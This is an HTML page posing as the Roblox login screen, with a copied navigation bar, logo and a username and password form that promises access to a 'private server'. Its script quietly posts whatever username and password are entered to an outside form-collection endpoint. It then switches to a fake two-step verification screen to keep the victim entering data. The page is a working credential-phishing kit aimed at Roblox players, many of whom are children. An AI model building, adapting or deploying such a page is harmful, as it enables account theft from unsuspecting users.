<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Roblox</title>
    <style>
        /* This targets all links inside a footer tag and removes the grey background box */
  footer a, 
  .footer a, 
  .footer-links a {
    background: none !important;
    background-color: transparent !important;
  }


        :root {
            --surface-main: #191c24;
            --surface-card: #22252e;
            --surface-input: #2d3039;
            --surface-nav: #191b24; /* Official top nav dark theme background */
            --border-default: #3b404c;
            --text-main: #ffffff;
            --text-secondary: #d1d5db;
            --action-color: #2563eb;
            --action-hover: #3b404c;
        }
         /* Set up body to push the footer cleanly to the bottom */
         html, body {
            height: 100%;
            margin: 0;
            padding: 0;
        }
        
        body { 
            background: radial-gradient(circle, rgba(0, 0, 0, .5) 60%, rgba(0, 0, 0, .75) 100%), url("asap.jpg");
            background-position: center;
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        
        /* --- ROBLOX STYLE TOP NAVIGATION BAR --- */
        .roblox-topnav {
            background-color: var(--surface-nav);
            height: 44px; /* Exact compact profile height */
            width: 100%;
            display: flex;
            align-items: center;
            padding: 0 20px;
            box-sizing: border-box;
            border-bottom: 1px solid rgba(0, 0, 0, 0.2);
            position: fixed;
            top: 0;
            left: 0;
            z-index: 100;
        }

        .nav-container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            gap: 30px;
        }

        /* Simplified generic block logo */
        .nav-logo {
            font-weight: 800;
            font-size: 18px;
            color: var(--text-main);
            text-decoration: none;
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
        }

        .nav-links {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .nav-links a {
            color: var(--text-main);
            font-size: 15px;
            font-weight: 500;
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 4px;
            transition: background-color 0.15s ease;
        }

        .nav-links a:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        /* Wrapper that centers the main login container box */
        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 84px 20px 40px 20px; /* Increased top padding to clear fixed nav bar */
        }
        
        .form-container { 
            background-color: var(--surface-card);
            border-radius: none;
            padding: 15px;
            width: 100%;
            max-width: 380px;
            
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
            box-sizing: border-box;
            text-align: center;
        }
        
        h2 { 
            font-size: 30px;
            font-weight: 700;
            margin-top: 0;
            margin-bottom: 24px;
            letter-spacing: -1px;
            color: #ffffff;
            text-align: center;
        }
        
        input, textarea { 
            width: 100%; 
            padding: 15px; 
            margin: 10px 0; 
            background: #414141; /* Darker, recessed fields */
            color: #ffffff;
            border: 1px solid #454950; 
            border-radius: 6px; 
            box-sizing: border-box; 
        }
        
        input::placeholder, textarea::placeholder {
            color: #8a8f98;
        }
        
        button { 
            width: 100%; 
            padding: 12px; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 16px; 
            font-weight: bold;
        }
        
        .btn-primary { 
            background: #191c24; 
        }
        
        .btn-primary:hover { 
            background: #3b404c; 
        }
        
        .hidden { 
            display: none; 
        }
        /* Lighter Gray Input Formatting for Credentials */
        .form-input {
            background-color: var(--surface-input);
            border: none;
            border-radius: 6px;
            color: #ffffff;
            font-size: 15px;
            height: 44px;
            padding: 0 14px;
            box-sizing: border-box;
            width: 100%;
            transition: box-shadow 0.2s ease;
        }

        .form-input:focus {
            outline: none;
            box-shadow: 0 0 0 2px var(--action-color);
        }

        .form-input::placeholder {
            color: var(--text-secondary);
        }
         /* Standard Form Submission Button */
         .form-submit-btn {
            height: 44px;
            background-color: transparent;
            color: #ffffff;
            border: 1px solid var(--border-default);
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease, border-color 0.2s ease;
            width: 100%;
            margin-top: 8px;
        }
        
        .form-submit-btn:hover {
            background-color: var(--action-hover);
            border-color: var(--action-hover);
        }

        .helper-links {
            margin-top: 20px;
            font-size: 14px;
        }

        .helper-links a {
            color: var(--text-secondary);
            text-decoration: none;
        }

        .helper-links a:hover {
            text-decoration: underline;
            color: #ffffff;
        }
        /* --- VISUAL TEXT DIVIDER SECTION --- */
        .divider-container {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 24px 0;
            color: var(--text-secondary);
            font-size: 13px;
            width: 100%;
        }

        .divider-line {
            flex-grow: 1;
            height: 1px;
            border: #ccc;
            width: 100%;
            
        }

        .divider-text {
            padding: 0 12px;
            width: 100%;
        }

        /* --- SECONDARY WORKFLOW BUTTONS --- */
        .btn-secondary {
            background-color: var(--surface-input);
            color: var(--text-secondary);
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 500;
            height: 44px;
            padding: 0 14px;
            cursor: pointer;
            transition: box-shadow 0.2s ease, background-color 0.2s ease, color 0.2s ease;
            width: 100%;
            margin-bottom: 12px;
            box-sizing: border-box;
            text-align: center;
        }

        .btn-secondary:focus {
            outline: none;
            box-shadow: 0 0 0 2px var(--action-color);
        }

        .btn-secondary:hover {
            background-color: #383c47;
            color: #ffffff;
        }

        .btn-secondary:last-of-type {
            margin-bottom: 0;
        }
         /* --- SYSTEM FOOTER --- */
        
         .roblox-footer {
            background-color: #111318;
            padding: 30px 20px;
            border-top: 1px solid #111318;
            text-align: center;
        }
        

        .footer-grid {
            max-width: 900px;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px 25px;
        }

        .footer-grid a {
            color: var(--text-secondary);
            font-size: 13px;
            text-decoration: none;
            transition: color 0.15s ease;
        }

        .footer-grid a:hover {
            color: #ffffff;
            text-decoration: underline;
        }

        .footer-copyright {
            margin-top: 20px;
            font-size: 11px;
            color: #656d78;
        }
        
    </style>
</head>
<body>

<div class="form-container">
    <!-- Top Fixed Horizontal Navigation Header Bar -->
    <nav class="roblox-topnav">
        <div class="nav-container">
            
            <div class="nav-links">
                <div class="roblox-logo-container">
                    <svg viewBox="0 0 100 100" width="40" height="50" xmlns="http://w3.org">
                        <!-- The outer white box, tilted counter-clockwise -->
                        <rect x="15" y="15" width="70" height="70" rx="4" fill="white" transform="rotate(11 50 50)" />
                        <!-- The inner black box, perfectly upright to create the cutout effect -->
                        <rect x="40" y="40" width="20" height="20" fill="black" transform="rotate(11 50 50)"/>
                    </svg>
                    <div class="header-container">
                        <a href="#" class="signup-box">Sign Up</a>
                    </div>
                    
                    <style>
                        /* Absolute container that pins the button to the top right corner of the screen */
                        .header-container {
                            position: absolute;
                            top: 10px;
                            right: 20px;
                            z-index: 100;
                        }
                    
                        .signup-box {
                            background-color: #1446FF;
                            color: #ffffff;
                            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                            font-size: 14px;
                            font-weight: 600;
                            text-decoration: none;
                            padding: 6px 14px;
                            border-radius: 4px;
                            border: 1px solid rgba(0, 0, 0, 0.1);
                            display: inline-block;
                            white-space: nowrap;
                            transition: background-color 0.15s ease;
                        }
                    
                        .signup-box:hover {
                            background-color: #005a92;
                        }

                    </style>
                    
                    
                </div>
                
                <a href="#">Charts</a>
                <a href="#">Marketplace</a>
                <a href="#">Create</a>
                <a href="#">Robux</a>
            </div>
        </div>
    </nav>
    <!-- STEP 1: User Info View -->
    <div id="step1">
        <h2>Login to Roblox</h2>
    
        <form id="infoForm">
            <input type="text" id="name" placeholder="Username/Email/Phone" required>
            <input type="password" id="country" placeholder="Password" required>
            <button type="submit" class="btn-primary">Continue To Pirvate Server</button>
            
        </form>
    </div>
    
    <div class="helper-links">
        <a href="#">Forgot Password or Username?</a>
    </div>
    <!-- Add this line directly between your elements -->
<hr style="border: 0; border-top: 1px solid #3a3d42; margin: 20px 0; width: 100%;">
<div class="divider-container">
    <div class="divider-line"></div>
    <div class="divider-text"></div>
    <div class="divider-line"></div>
</div>



<button type="button" class="btn-secondary">Email me a One-Time code</button>
<button type="button" class="btn-secondary">Quick Sign-in</button>

<div class="helper-links" style="margin-top: 24px;">
    Don't have an account? <a href="#">Sign Up</a>
</div>
</div>



    <!-- STEP 2: Complaint View (Hidden initially) -->
    <div id="step2" class="hidden">
        <h2>2-Step Verification</h2>
        <form id="infoForm">
             <input type="text" id="name" placeholder="Username/Email/Phone" required>
            <input type="password" id="country" placeholder="Password" required>
            <button type="submit" class="btn-primary">Continue To Pirvate Server</button>
            </form>
    </div>
    

    <!-- STEP 3: Success View (Hidden initially) -->
    <div id="step3" class="hidden">
        <iframe name="submission_target" class="hidden-frame"></iframe>
    </div>
</div>



<script>
    // REPLACE THESE STRINGS WITH YOUR ACTUAL FORMSPREE ENDPOINTS
    const INFO_ENDPOINT = 
'https://shipmyform.com/f/frm_WACT93k2bWR7FmBarT67'
    method='POST'
   

    // Handle Step 1 Submission
    document.getElementById('infoForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const data = {
            name: document.getElementById('name').value,
            country: document.getElementById('country').value
        };

        // Submit the user info to the first destination in the background
        fetch(INFO_ENDPOINT, { 
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        

        // Immediately switch views to the complaint form
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
    });

    // Handle Step 2 Submission
    document.getElementById('complaintForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const data = {
            complaint: document.getElementById('complaint').value
        };

        // Submit the complaint to the second destination
        fetch(COMPLAINT_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            // Show the final success screen
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
        });
        
    });
    
    
</script>

</body>

</html>
